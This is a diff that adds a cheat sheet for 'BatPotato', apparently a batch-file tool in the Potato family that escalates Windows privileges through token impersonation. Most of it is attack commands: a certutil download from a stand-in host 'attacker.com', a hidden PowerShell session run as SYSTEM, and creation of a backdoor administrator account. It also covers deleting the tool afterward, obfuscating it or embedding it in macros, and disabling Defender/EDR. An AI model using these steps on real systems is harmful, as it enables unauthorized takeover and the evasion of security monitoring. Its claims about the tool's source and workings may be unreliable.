@@ -1,0 +1,42 @@
+# ================= BatPotato =================
+# Description:
+# BatPotato is a simple BAT file implementation of the Rotten/Juicy/Rogue Potato exploit family.
+# It performs privilege escalation via Windows token impersonation using COM services.
+
+# Repository (Archived/Community):  
+# https://github.com/hatRiot/batpotato (or other forks from security researchers)
+
+# ---------------- SETUP ----------------
+# 1. Transfer BatPotato.bat to the target machine
+# Example using certutil:
+certutil -urlcache -f http://attacker.com/BatPotato.bat BatPotato.bat
+
+# 2. Ensure the current user is in a group that can trigger service tokens
+# Example: User is a local admin or has SeImpersonatePrivilege
+
+# ---------------- USAGE ----------------
+# Execute BatPotato.bat with a command to run as SYSTEM:
+BatPotato.bat "cmd.exe"
+
+# Example: Open SYSTEM-level command shell
+BatPotato.bat "powershell.exe -NoP -NonI -W Hidden -Exec Bypass"
+
+# Example: Add admin user (replace 'hacker' and '1234' accordingly)
+BatPotato.bat "net user hacker 1234 /add && net localgroup administrators hacker /add"
+
+# ---------------- NOTES ----------------
+# - May trigger AV/EDR alerts due to known potato behavior
+# - Only works if the target is vulnerable to token impersonation
+# - Does not require external compilation (BAT-based)
+
+# ---------------- VERIFICATION ----------------
+# After successful run:
+whoami        # Should return: NT AUTHORITY\SYSTEM
+
+# ---------------- CLEANUP ----------------
+del BatPotato.bat
+
+# ---------------- TIPS ----------------
+# Use as backup when binary-based Potato tools are blocked
+# Can be obfuscated using BAT encoders or embedded in macros/scripts
+# Recommended: Disable Defender/EDR before use (in lab or red team settings)
